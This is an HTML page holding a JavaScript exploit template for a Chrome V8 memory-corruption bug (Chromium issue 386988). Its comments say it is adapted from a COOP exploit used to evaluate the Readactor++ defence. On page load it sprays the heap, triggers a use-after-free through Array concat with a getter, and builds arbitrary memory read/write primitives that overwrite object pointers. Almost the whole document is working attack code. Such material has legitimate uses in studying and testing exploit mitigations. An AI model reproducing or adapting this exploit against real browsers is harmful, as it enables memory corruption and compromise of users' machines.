<!--

Exploit for TABE, based on exploit for the Readactor++ bypass
For credits and history see below:
-

Exploit for Readactor++-protected Chrome (as shared by Stephen Crane et al.).
This is based on their original COOP exploit used to evaluate Readactor++.

Modify this template, then issue ./generate.py && ./serve.py to update and serve
the individual exploits.

https://bugs.chromium.org/p/chromium/issues/detail?id=386988
- mcontag

[0x1c843e2, 0x1c843e8, 0x1c843f1, 0x1c84580, 0x1c84420, 0x1c845c0, 0x1c845ca, 0x1c84690, 0x1c8469d, 0x1c84443, 0x1c844a6, 0x1c844af, 0x1c844b5, 0x1c84628, 0x1c844d0, 0x1c847d8, 0x1a8b8c0]

!-->


<html>
<head>
<meta http-equiv="pragma" content="no-cache" />
</head>
<script>

function log(s) {
    var log = document.getElementById("dlog");
    var ele = document.createElement("span");
    console.log(s);
    ele.innerHTML = s;
    log.appendChild(ele);
    log.appendChild(document.createElement("br"));
}

function hex(a) {
    if (a == undefined) return "0xUNDEFINED";
    var ret = a.toString(16);
    if (ret.substr(0,2) != "0x") return "0x"+ret;
    else return ret;
}

function hexdump(mem, size) {
	var ss = new Array();
	var idx = 0;
	for(var i=0; i<size; i++){
		if(i % 0x10 == 0){
			idx++;
			ss[idx] = "";
		}
		ss[idx] += hex(mem[i]).substr(2, 4) + " ";
	}
	for(var i=0; i<ss.length; i++){
		log(ss[i]);
	}
}

function sleep(ms) {
	var tt = new Date().getTime();
	while(new Date().getTime() < tt + ms) {
	}
}


// u64 stuff
//{{{1

var u64 = function(hi, lo) {
    this.lo_ = lo;
    this.hi_ = hi;
}

u64.ZERO = new u64(0,0);
u64.ONE = new u64(0,1);

u64.prototype.hex = function() {
    hlo = (this.lo_ < 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_).toString(16)
    hhi = (this.hi_ < 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_).toString(16)
    if(hlo.substr(0,2) == "0x") hlo = hlo.substr(2,hlo.length);
    if(hhi.substr(0,2) == "0x") hhi = hhi.substr(2,hji.length);
    hlo = "00000000" + hlo
    hlo = hlo.substr(hlo.length-8, hlo.length)
    return "0x" + hhi + hlo;
}

u64.prototype.isZero = function() {
    return this.hi_ == 0 && this.lo_ == 0;
}


u64.prototype.equals = function(val) {
    return this._hi == val.hi_ && this.lo_ && val.lo_;
}

u64.prototype.and = function(val) {
    return new u64(this.hi_ & val.hi_, this.lo_ & val.lo_);
}

u64.prototype.add = function(val) {
	// don't use this... bugs ahead
    hlo = (this.lo_ < 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_)
    hhi = (this.hi_ < 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_)

    vlo = (val.lo_ < 0 ? (0xFFFFFFFF + val.lo_ + 1) : val.lo_)
    vhi = (val.hi_ < 0 ? (0xFFFFFFFF + val.hi_ + 1) : val.hi_)

    var a48 = hhi >>> 16;
    var a32 = hhi & 0xFFFF;
    var a16 = hlo >>> 16;
    var a00 = hlo & 0xFFFF;

    var b48 = vhi >>> 16;
    var b32 = vhi & 0xFFFF;
    var b16 = vlo >>> 16;
    var b00 = vlo & 0xFFFF;

    var c48 = 0, c32 = 0, c16 = 0, c00 = 0;
    c00 += a00 + b00;
    c16 += c00 >>> 16;
    c00 &= 0xFFFF;
    c16 += a16 + b16;
    c32 += c16 >>> 16;
    c16 &= 0xFFFF;
    c32 += a32 + b32;
    c48 += c32 >>> 16;
    c32 &= 0xFFFF;
    c48 += a48 + b48;
    c48 &= 0xFFFF;

    return new u64((c48 << 16) | c32, (c16 << 16) | c00);
}

u64.prototype.addi = function(h,l) {
    return this.add(new u64(h,l));
}

u64.prototype.subi = function(h,l) {
    return this.sub(new u64(h,l));
}

u64.prototype.not = function() {
    return new u64(~this.hi_, ~this.lo_);
}

u64.prototype.neg = function() {
    return this.not().add(u64.ONE);
}

u64.prototype.sub = function(val) {
    return this.add(val.neg());
}

function swap32(val) {
    return ((val & 0xFF) << 24) | ((val & 0xFF00) << 8) |
    ((val >> 8) & 0xFF00) | ((val >> 24) & 0xFF);
}

u64.prototype.bswap = function() {
    var lo = swap32(this.lo_);
    var hi = swap32(this.hi_);

    return new u64(lo, hi);

}

u64.prototype.shift8r = function() {
	var hi = this.hi_;
	var lo = this.lo_;
	var x = hi & 0xff;
	var new_lo = ((x<<24)>>>0) + (((lo>>8)&0x00ffffff)>>>0);
	var new_hi = ((hi>>8)&0x00ffffff);
	return new u64(new_hi, new_lo);
}

u64.prototype.to_addr = function() {
    hlo = (this.lo_ < 0 ? (0xFFFFFFFF + this.lo_ + 1) : this.lo_)
    hhi = (this.hi_ < 0 ? (0xFFFFFFFF + this.hi_ + 1) : this.hi_)
	return hhi*0x100000000 + hlo
}

//1}}}



function get_address(mem, idx){
	var offset = idx*8;
	return new u64((mem[28+offset] << 8)  | (mem[27+offset]), 
				   (mem[26+offset] << 24) | (mem[25+offset] << 16) | (mem[24+offset] << 8) | mem[23+offset]);
}

function read64obj(freed, corrupt, idx_addr, obj, idx){
	//{{{1
	freed[idx_addr] = obj;
	var mem = new Uint8Array(corrupt);
	var offset = idx;
	return new u64((mem[7+offset] << 24) | (mem[6+offset] << 16) | (mem[5+offset] << 8) | (mem[4+offset]), 
				   (mem[3+offset] << 24) | (mem[2+offset] << 16) | (mem[1+offset] << 8) | mem[offset]);
	//1}}}
}




function mem_addr(freed, corrupt, idx, addr, size){
	//{{{
	freed[idx] = size;
	freed[idx-1] = corrupt;
	
	// corrupt:
	//aaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbb	
	//cccccccccccccccc [    corrupt   ] --> backing buffer
	//[    size      ] 

	var tmp = new Uint8Array(corrupt);
	// write address
  	tmp[28] = (((addr/0x10000)>>24)&0xff);
  	tmp[27] = (((addr/0x10000)>>16)&0xff);
  	tmp[26] = (((addr)>>24)&0xff);
  	tmp[25] = (((addr)>>16)&0xff);
  	tmp[24] = (((addr)>>8)&0xff);
  	tmp[23] = (((addr)>>0)&0xff);

	// corrupt:
	//aaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbb	
	//cccccccccccccccc [    addr      ] --> backing buffer
	//[    size      ] 


	var mem = new Uint8Array(corrupt);
	return mem;
	//1}}}
}

function read64(mem, offset) {
	return new u64((mem[7+offset] << 24) | (mem[6+offset] << 16) | (mem[5+offset] << 8) | (mem[4+offset]), 
					   (mem[3+offset] << 24) | (mem[2+offset] << 16) | (mem[1+offset] << 8) | mem[offset]);
}

function write64(mem, offset, value) {
	//{{{1
	var lo = value.lo_;
	var hi = value.hi_;
	mem[offset] =   (lo)&0xff;							  	
	mem[offset+1] = (lo>>8)&0xff;							  	
	mem[offset+2] = (lo>>16)&0xff;							  	
	mem[offset+3] = (lo>>24)&0xff;							  	
	mem[offset+4] = (hi)&0xff;							  	
	mem[offset+5] = (hi>>8)&0xff;							  	
	mem[offset+6] = (hi>>16)&0xff;							  	
	mem[offset+7] = (hi>>24)&0xff;							  	
	//1}}}
}

function write64obj(freed, corrupt, idx_addr, obj, idx, data){
  //{{{1
	freed[idx_addr] = obj;
	var mem = new Uint8Array(corrupt);
	var offset = idx;
	mem[offset+0] = (data.lo_) & 0xff;
	mem[offset+1] = (data.lo_>>8) & 0xff;
	mem[offset+2] = (data.lo_>>16) & 0xff;
	mem[offset+3] = (data.lo_>>24) & 0xff;
	mem[offset+4] = (data.hi_) & 0xff;
	mem[offset+5] = (data.hi_>>8) & 0xff;
	mem[offset+6] = (data.hi_>>16) & 0xff;
	mem[offset+7] = (data.hi_>>24) & 0xff;
  //1}}}
}




var dontGc = [];


function exploit_issue_387031() {
	// {{{1
    //
    // Taken from:
    // https://code.google.com/p/chromium/issues/detail?id=386988
    //
    //
    window.gc = function () {
        for (i = 0; i < 50; i++) {
            zz = new ArrayBuffer(0x100000);
            zz = null;
        }
    };

    var JUNK_SIZE = 0x800;
    var JUNK_TAG = 0x21827313;


    // From here

    var arrayCreator = [];
    for (var i = 0; i < 1000; i++) {
        arrayCreator[i] = (function () {
            var a = Array.apply(null, new Array(JUNK_SIZE - 2)).map(
                function () {return 0x11111111;});
            var b = [];

            a[1] = 0x12345678;
            a.__defineGetter__("0", function () {
                b.length = JUNK_SIZE * 2;
                return 0x21983478;
            });

            return function () {
                return a.concat(b);
            };
        })();
    }

    var tmp = [];
    for (var i = 0; i < 100; i++) {
        tmp[i] = Array.apply(null, new Array(200)).map(function () {
            return 1234;
        });
    }

    var obj = tmp[tmp.length/2];
    var abs = new Array(0x400000);
    for (var i = 0; i < abs.length; i++) abs[i] = null;

    var holes    = Array.apply(null, new Array(arrayCreator.length * 2));
    var junks    = Array.apply(null, new Array(arrayCreator.length));
    var corrupts = Array.apply(null, new Array(arrayCreator.length));

    var t = Array.apply(null, new Array(JUNK_SIZE - 2)).map(function () {
        return 0x22222222;
    });

    dontGc.push(abs);
    t[0]  = JUNK_TAG;

    for (var i = 0; i < holes.length; i++)
        holes[i] = t.concat();

    for (var i = 0; i < arrayCreator.length; i++) {
        junks[i] = t.concat();
        corrupts[i] = arrayCreator[i]();
    }

    for (var i = 0; i < junks.length; i++)
        junks[i][0x40] = obj;

    var idxs = [];

    for (var i = 400; i < 700; i++) {
        var v = corrupts[i][JUNK_SIZE];
        if (Number.isInteger(v) && v == JUNK_TAG) {
            idxs.push(i);
        }
    }

    t = null;
    junks = null;
    //holes = null;
    gc();

    obj = null;
    gc();
    gc();
    gc();

    function findFreed() {
        for (var i = 0; i < idxs.length; i++) {
            var v = corrupts[idxs[i]][JUNK_SIZE + 0x40];
            if (v != null && v.length) {
                return v;
            }
        }
        return null;
    }

    var freed = findFreed();
    if(freed == null) {
        log("fail freed");
        return null;
    }
    dontGc.push(freed);
    gc();
    gc();
    gc();

    for (var i = 0; i < abs.length; i++)
        abs[i] = new ArrayBuffer(7);

    function findCorrupt() {
        for (var i = 0; i < abs.length; i++) {
            if (abs[i].byteLength != 7) {
                return abs[i];
            }
        }
        return null;
    }


    for (var i = 1; i < freed.length; i++) {
        if (!Number.isSafeInteger(freed[i]) || freed[i] != 7)
            continue;
        freed[i] = 0x30000000;
        var ab = findCorrupt();
        //log(ab);
        if(ab == null) {
            log("findCorrupt failed");
            return "null";
        }

        else {
            freed[i-1]   = new ArrayBuffer(0xF0010);
            //return [freed[i-1], ab];
            return [freed, ab, i];
        }
    }
    return null;
	//1}}}
}


function read_u64_from_ab_disaligned(ab, index) {
	//{{{1
    var a8 = new Uint8Array(ab);
    return new u64(a8[index + 7] << 24 | a8[index + 6] << 16 | a8[index + 5] << 8 | a8[index + 4],
                   a8[index + 3] << 24 | a8[index + 2] << 16 | a8[index + 1] << 8 | a8[index]);
	//1}}}
}

function write_u64_to_ab_disaligned(ab, index, data) {
	//{{{1
    var a8 = new Uint8Array(ab);
    a8[index + 7] = (data.hi_ >> 24) & 0xFF; a8[index + 6] = (data.hi_ >> 16) & 0xFF;
    a8[index + 5] = (data.hi_ >> 8) & 0xFF; a8[index + 4] = (data.hi_) & 0xFF;
    a8[index + 3] = (data.lo_ >> 24) & 0xFF; a8[index + 2] = (data.lo_ >> 16) & 0xFF;
    a8[index + 1] = (data.lo_ >> 8) & 0xFF; a8[index] = (data.lo_) & 0xFF;
	//1}}}
}

function prepare() {
	//{{{1
    r = exploit_issue_387031();
    if(r == null) {
        setTimeout('document.location.reload();', 1000);
        return log('Retrying.');
    }

    log('Success.');

    BUF_DATA_SLOT = 0;
    CORR_BUFFER_SLOT = 23;
	
	freed = r[0];
	corrupt = r[1];
	idx = r[2];

	freed[idx] = 0x300;	
	test_obj = [1, 2, 3, 4, 5];
	test_obj2 = {"x": 0x12231224, "a": test_obj, "b": 0x13361337};
	test_obj_bak_offset = 8*2;
	test_obj_index = 0;
	test_obj_value = 0x1122;
	test_obj_bak_offset = 8*2;

	poc_addr = read64obj(freed, corrupt, idx-1, test_obj, 7+8);
	target_addr = new u64(poc_addr.hi_, poc_addr.lo_+0x00);  // needs to be a mapped address
	for(var i=0; i<0x1000; i++){
		// trigger realloc 
		test_obj_addr = read64obj(freed, corrupt, idx-1, test_obj2, 7+24);
		test_obj_addr = new u64(test_obj_addr.hi_, test_obj_addr.lo_-1);
	}

  	// test_obj_addr ---(+test_obj_bak_offset)--> poc_addr
//--- GENERATED PART START ---
	var mem0 = mem_addr(freed, corrupt, idx, test_obj_addr.to_addr(), 0x300);
	write64(mem0, test_obj_bak_offset, target_addr);
//--- GENERATED PART END ---

	//test_obj[0] = 0xaabb;

	//1}}}	
}

function main() {
    prepare();
}

function trigger(){
	test_obj[test_obj_index] = test_obj_value;
}

</script>
<body onload="main();">
<div id="dlog" />
	<form>
		<input id="clickme" type="button" value="clickme" onclick="trigger();" />
	</form>
</body>
</html>
